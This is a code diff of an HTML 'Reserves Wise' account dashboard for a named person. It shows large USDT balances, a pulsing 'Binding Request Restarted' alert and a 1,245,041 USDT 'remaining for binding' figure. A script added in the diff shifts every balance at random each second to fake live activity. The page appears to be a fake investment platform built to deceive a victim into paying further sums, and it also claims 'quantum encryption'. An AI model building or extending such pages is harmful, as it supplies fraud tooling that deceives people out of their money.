@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Yasin Yildirim | Reserves Wise</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body, html {
@@ -12,6 +12,7 @@
       font-family: 'Montserrat', sans-serif;
       color: #e0f7ff;
       overflow: hidden;
+      background: #000;
     }
 
     .container {
@@ -28,118 +29,198 @@
       content: '';
       position: absolute;
       top: 0; left: 0; width: 100%; height: 100%;
-      background: linear-gradient(to right, rgba(0, 10, 30, 0.9), transparent);
+      background: linear-gradient(to right, rgba(0, 10, 30, 0.92), transparent);
     }
 
     .right {
-      background: linear-gradient(135deg, rgba(0, 20, 60, 0.95), rgba(0, 10, 40, 0.98));
-      padding: 30px;
+      background: linear-gradient(135deg, rgba(0, 20, 60, 0.98), rgba(0, 10, 40, 0.99));
+      padding: 25px;
       display: flex;
       flex-direction: column;
-      gap: 20px;
+      gap: 18px;
       overflow-y: auto;
       position: relative;
     }
 
-    /* LOGOUT - FRONT & CENTER */
     .logout {
       position: absolute;
-      top: 20px;
-      right: 20px;
-      background: linear-gradient(135deg, #1e88e5, #42a5f5);
+      top: 18px;
+      right: 18px;
+      background: linear-gradient(135deg, #1e40af, #3b82f6);
       color: white;
       padding: 10px 18px;
       border-radius: 30px;
       text-decoration: none;
-      font-weight: bold;
+      font-weight: 700;
       font-size: 14px;
-      box-shadow: 0 4px 15px rgba(30, 136, 229, 0.4);
-      transition: 0.3s;
+      box-shadow: 0 6px 20px rgba(30, 136, 229, 0.5);
       z-index: 9999;
+      transition: 0.3s;
     }
     .logout:hover {
-      background: linear-gradient(135deg, #1976d2, #1e88e5);
+      background: linear-gradient(135deg, #1e3a8a, #2563eb);
       transform: translateY(-2px);
     }
 
     .glass-card {
-      background: rgba(10, 30, 70, 0.3);
-      backdrop-filter: blur(14px) saturate(160%);
-      -webkit-backdrop-filter: blur(14px) saturate(160%);
-      border-radius: 18px;
-      padding: 20px;
-      border: 1px solid rgba(100, 181, 246, 0.25);
-      box-shadow: 0 8px 28px rgba(0, 30, 80, 0.3);
-      transition: all 0.3s ease;
+      background: rgba(10, 30, 70, 0.45);
+      backdrop-filter: blur(20px) saturate(200%);
+      -webkit-backdrop-filter: blur(20px) saturate(200%);
+      border-radius: 20px;
+      padding: 22px;
+      border: 2px solid rgba(100, 181, 246, 0.4);
+      box-shadow: 
+        0 15px 40px rgba(0, 30, 80, 0.6),
+        0 0 30px rgba(100, 181, 246, 0.3);
+      transition: all 0.4s ease;
     }
     .glass-card:hover {
-      transform: translateY(-4px);
-      border-color: rgba(100, 181, 246, 0.4);
+      transform: translateY(-5px);
+      border-color: rgba(100, 181, 246, 0.6);
+      box-shadow: 0 20px 50px rgba(30, 136, 229, 0.5);
     }
 
     .header h1 {
       font-family: 'Cinzel', serif;
       font-size: 28px;
-      color: #64b5f6;
-      text-shadow: 0 0 10px rgba(100, 181, 246, 0.3);
+      background: linear-gradient(135deg, #64b5f6, #42a5f5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 15px rgba(100, 181, 246, 0.5);
       letter-spacing: 2px;
+      text-align: center;
     }
 
-    /* TICKER - SMOOTH INFINITE */
     .ticker {
-      padding: 16px;
+      padding: 14px;
       text-align: center;
       font-family: 'Cinzel', serif;
-      font-size: 15px;
-      background: rgba(10, 25, 50, 0.4);
-      border-radius: 12px;
+      font-size: 14px;
+      background: rgba(10, 25, 50, 0.5);
+      border-radius: 14px;
       overflow: hidden;
       white-space: nowrap;
+      border: 1px solid rgba(100, 181, 246, 0.3);
     }
     .ticker-inner {
       display: inline-block;
-      animation: scroll 60s linear infinite;
+      animation: scroll 45s linear infinite;
     }
     @keyframes scroll {
       0% { transform: translateX(0); }
       100% { transform: translateX(-100%); }
     }
-    .price { margin: 0 25px; }
+    .price { margin: 0 22px; font-weight: 600; }
 
     .current-amount { text-align: center; }
-    .main-amount { font-size: 36px; font-family: 'Cinzel', serif; font-weight: bold; color: #fff; margin-bottom: 8px; }
-    .ready-transfer { font-size: 16px; color: #42a5f5; margin-bottom: 6px; }
-    .transfer-stage { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 14px; color: #ffca28; background: rgba(255, 202, 40, 0.15); padding: 8px 16px; border-radius: 30px; width: fit-content; margin: 0 auto; }
+    .main-amount {
+      font-size: 38px;
+      font-family: 'Cinzel', serif;
+      font-weight: 700;
+      color: #fff;
+      text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+      margin-bottom: 8px;
+    }
+    .ready-transfer {
+      font-size: 16px;
+      color: #42a5f5;
+      margin: 8px 0;
+      font-weight: 600;
+    }
+    .transfer-stage {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      font-size: 14px; color: #ffca28; background: rgba(255, 202, 40, 0.2);
+      padding: 8px 18px; border-radius: 30px; width: fit-content; margin: 0 auto;
+      border: 1px solid rgba(255, 202, 40, 0.4);
+    }
     .transfer-stage i { animation: spin 1.5s linear infinite; }
     @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; }
-    .stat-box h3 { font-size: 13px; color: #90caf9; margin-bottom: 6px; }
-    .stat-box p { font-size: 22px; font-family: 'Cinzel', serif; font-weight: bold; color: #fff; }
+    .stats {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      position: relative;
+    }
+    .stat-box {
+      text-align: center;
+      padding: 16px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 14px;
+      border: 1px solid rgba(100, 181, 246, 0.3);
+    }
+    .stat-box h3 {
+      font-size: 13px;
+      color: #90caf9;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    .stat-box p {
+      font-size: 20px;
+      font-family: 'Cinzel', serif;
+      font-weight: 700;
+      color: #fff;
+    }
 
-    .updates { display: grid; grid-template-columns: 1fr; gap: 16px; margin-top: 10px; }
-    .update-item { padding: 16px; background: rgba(255, 255, 255, 0.05); border-left: 4px solid #42a5f5; border-radius: 0 12px 12px 0; }
-    .update-item h4 { color: #64b5f6; font-size: 15px; margin-bottom: 6px; }
+    /* BINDING REQUEST - RED */
+    .binding-alert {
+      position: absolute;
+      top: -12px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, #dc2626, #ef4444);
+      color: white;
+      padding: 6px 16px;
+      border-radius: 30px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      box-shadow: 0 4px 15px rgba(220, 38, 38, 0.5);
+      white-space: nowrap;
+      z-index: 10;
+      animation: pulse-red 2s infinite;
+    }
+    @keyframes pulse-red {
+      0%, 100% { transform: translateX(-50%) scale(1); }
+      50% { transform: translateX(-50%) scale(1.05); }
+    }
+
+    .updates { display: grid; gap: 14px; }
+    .update-item {
+      padding: 16px;
+      background: rgba(255, 255, 255, 0.07);
+      border-left: 4px solid #42a5f5;
+      border-radius: 0 12px 12px 0;
+      transition: 0.3s;
+    }
+    .update-item:hover {
+      background: rgba(255, 255, 255, 0.12);
+      border-left-color: #64b5f6;
+    }
+    .update-item h4 { color: #64b5f6; font-size: 15px; margin-bottom: 6px; font-weight: 600; }
     .update-item p { font-size: 13px; color: #bbdefb; line-height: 1.5; }
 
     .footer-links {
       margin-top: auto;
       display: flex;
       justify-content: space-between;
-      padding: 18px 25px;
-      background: rgba(10, 25, 50, 0.4);
-      backdrop-filter: blur(12px);
+      padding: 16px 20px;
+      background: rgba(10, 25, 50, 0.5);
+      backdrop-filter: blur(14px);
       border-radius: 16px;
-      border: 1px solid rgba(100, 181, 246, 0.2);
+      border: 1.5px solid rgba(100, 181, 246, 0.3);
       font-size: 13px;
     }
-    .footer-links a { color: #90caf9; text-decoration: none; }
-    .footer-links a:hover { color: #64b5f6; }
+    .footer-links a { color: #90caf9; text-decoration: none; font-weight: 500; }
+    .footer-links a:hover { color: #64b5f6; text-shadow: 0 0 10px rgba(100, 181, 246, 0.6); }
 
     @media (max-width: 768px) {
       .container { grid-template-columns: 1fr; }
       .left { display: none; }
-      .right { padding: 20px; }
+      .right { padding: 18px; gap: 16px; }
+      .main-amount { font-size: 32px; }
+      .stats { grid-template-columns: 1fr; }
+      .binding-alert { font-size: 11px; padding: 5px 12px; top: -10px; }
       .footer-links { flex-direction: column; gap: 12px; text-align: center; }
     }
   </style>
@@ -150,10 +231,8 @@
     <div class="left"></div>
 
     <div class="right">
-      <!-- LOGOUT FRONT -->
       <a href="index.html" class="logout" onclick="localStorage.removeItem('loggedIn'); return true;">Logout</a>
 
-      <!-- TICKER TOP -->
       <div class="glass-card ticker">
         <div class="ticker-inner" id="crypto-ticker">
           BTC $71,200 Up 2.1% • ETH $3,450 Down 0.8% • BNB $620 Up 1.5% • SOL $180 Up 3.2% • XRP $0.62 Down 1.1% • 
@@ -161,27 +240,41 @@
         </div>
       </div>
 
-      <div class="glass-card header" style="text-align:center;padding:25px;">
+      <div class="glass-card header">
         <h1>YASIN YILDIRIM</h1>
-        <p>Account Dashboard • Reserves Wise</p>
+        <p style="text-align:center;font-size:14px;color:#90caf9;font-weight:500;">Account Dashboard • Reserves Wise</p>
       </div>
 
+      <!-- MAIN BALANCE -->
       <div class="glass-card current-amount">
-        <div class="main-amount">$12,450.00</div>
-        <div class="ready-transfer">Ready to Transfer: $2,800.00</div>
+        <div class="main-amount" id="mainBalance">320,090.32 USDT</div>
+        <div class="ready-transfer" id="readyTransfer">Ready to Transfer: 320,090.32 USDT</div>
         <div class="transfer-stage"><i>⟳</i> Transfer Stage: Processing</div>
       </div>
 
-      <div class="glass-card stats">
-        <div class="stat-box"><h3>RECEIVED AMOUNT</h3><p>$8,720.50</p></div>
-        <div class="stat-box"><h3>PENDING AMOUNT</h3><p>$3,729.50</p></div>
+      <!-- STATS WITH BINDING -->
+      <div class="glass-card" style="position:relative;">
+        <div class="binding-alert">Binding Request Restarted</div>
+        <div class="stats">
+          <div class="stat-box">
+            <h3>RECEIVED AMOUNT</h3>
+            <p id="receivedAmount">872,090.50 USDT</p>
+          </div>
+          <div class="stat-box">
+            <h3>PENDING AMOUNT</h3>
+            <p id="pendingAmount">372,950.50 USDT</p>
+          </div>
+        </div>
+        <div style="text-align:center;margin-top:12px;color:#90caf9;font-size:13px;">
+          <strong>Remaining USDT for Binding:</strong> <span id="bindingAmount" style="color:#64b5f6;font-weight:700;">1,245,041.00 USDT</span>
+        </div>
       </div>
 
       <div class="glass-card updates">
-        <div class="update-item"><h4>Platform Update</h4><p>New security layer added. All transactions now use quantum encryption.</p></div>
-        <div class="update-item"><h4>Market Alert</h4><p>BTC crossed $72,000. Consider rebalancing your reserves.</p></div>
-        <div class="update-item"><h4>System Maintenance</h4><p>Scheduled downtime: Nov 5, 2:00 AM - 2:30 AM UTC.</p></div>
-        <div class="update-item"><h4>Referral Bonus</h4><p>Invite 3 users → Get $500 credit. Program ends in 7 days.</p></div>
+        <div class="update-item"><h4>Platform Update</h4><p>Quantum encryption layer deployed across all nodes.</p></div>
+        <div class="update-item"><h4>Market Alert</h4><p>USDT peg stable at 1.0001. High volume detected.</p></div>
+        <div class="update-item"><h4>System Sync</h4><p>Binding engine restarted. Queue cleared.</p></div>
+        <div class="update-item"><h4>Referral Bonus</h4><p>Invite 3 → Get 500 USDT. Ends in 7 days.</p></div>
       </div>
 
       <div class="footer-links">
@@ -192,9 +285,7 @@
         </div>
         <div style="text-align:right;">
           <strong>About Us:</strong><br>
-          <span style="font-size:12px;color:#bbdefb;">
-            Global financial infrastructure for seamless transfers in 180+ currencies.
-          </span>
+          <span style="font-size:12px;color:#bbdefb;">Global USDT Reserve Network</span>
         </div>
       </div>
     </div>
@@ -202,6 +293,36 @@
 
   <script>
     if (!localStorage.getItem('loggedIn')) window.location = 'index.html';
+
+    // LIVE USDT FLUCTUATION (Every 1 sec)
+    const baseReady = 320090.32;
+    const baseReceived = 872090.50;
+    const basePending = 372950.50;
+    const baseBinding = 1245041.00;
+
+    function formatUSDT(num) {
+      return num.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",") + " USDT";
+    }
+
+    function fluctuate() {
+      const change = (Math.random() - 0.5) * 200; // ±100 USDT
+      const newReady = Math.max(300000, baseReady + change);
+      document.getElementById('mainBalance').textContent = formatUSDT(newReady);
+      document.getElementById('readyTransfer').textContent = "Ready to Transfer: " + formatUSDT(newReady);
+
+      // Sync others
+      const received = baseReceived + (change * 0.7);
+      const pending = basePending + (change * 0.3);
+      const binding = baseBinding - change;
+
+      document.getElementById('receivedAmount').textContent = formatUSDT(received);
+      document.getElementById('pendingAmount').textContent = formatUSDT(pending);
+      document.getElementById('bindingAmount').textContent = formatUSDT(binding);
+    }
+
+    // Start live update
+    setInterval(fluctuate, 1000);
+    fluctuate(); // Initial
   </script>
 </body>
 </html>
